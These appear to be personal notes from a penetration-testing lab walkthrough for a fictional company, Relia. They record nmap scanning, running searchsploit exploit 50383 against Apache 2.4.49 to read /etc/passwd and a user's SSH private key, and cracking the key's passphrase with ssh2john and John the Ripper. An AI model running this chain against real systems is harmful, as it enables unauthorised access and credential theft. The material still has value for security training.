# Questions
We are tasked with a penetration test of Relia, an industrial company building driving systems for the timber industry. The target got attacked a few weeks ago and wants now to get an assessment of their IT security. Their goal is to determine if an attacker can breach the perimeter and get access to the domain controller in the internal network.

# Scan the DMZ network
sudo nmap -sC -sV -T4 192.168.243.245-250 192.168.243.189,191
[port-scanning.md]

# Found some interesting port from .245 where it have 2222 running and 21
ssh root@192.168.243.245 -p 2222  
root@192.168.243.245: Permission denied (publickey).
# It required public key, lets try to access FTP port with anonymous user
ftp -p 203.0.113.0
# When prompted for a username, you can enter either “ftp” or “anonymous”. Both are same

# Unfortunately anonymous access FTP is not valid
# Lets focus on the web server, based on the port scanning results, we can see the Apache HTTP server is using 2.4.49
searchsploit apache 2.4.49
searchsploit -m 50383.sh  

# Run the exploitation
code targets.txt
bash 50383.sh targets.txt /etc/passwd
# Here we get some users lets update to user file
[user.txt]

# We can try to check on each user .ssh path 
# Common private key filename can refer to below 
id_rsa：RSA私钥文件。
id_dsa：DSA私钥文件（较少使用）。
id_ecdsa：ECDSA私钥文件（使用椭圆曲线加密算法）。
id_ed25519：Ed25519私钥文件（使用EdDSA算法）。
id_xmss：XMSS私钥文件（使用Hash-based签名算法）。

# Then we found anita user have id_edcsa
sudo bash 50383.sh targets.txt /home/anita/.ssh/id_ecdsa

# Then we found the privatekey require passphrase
ssh -i id_edcsa anita@192.168.243.245 -p 2222
Enter passphrase for key 'id_edcsa': 

# Use ssh2john to extract the hash
ssh2john id_edcsa > ssh.hash

hashcat -h | grep -i "ssh" 
...
22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
...
# Hashcat seem unable to crack we can try with JohntheRipper
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt 
...
fireball         (id_edcsa) 
...

# SSH it with the password cracked again
cat local.txt



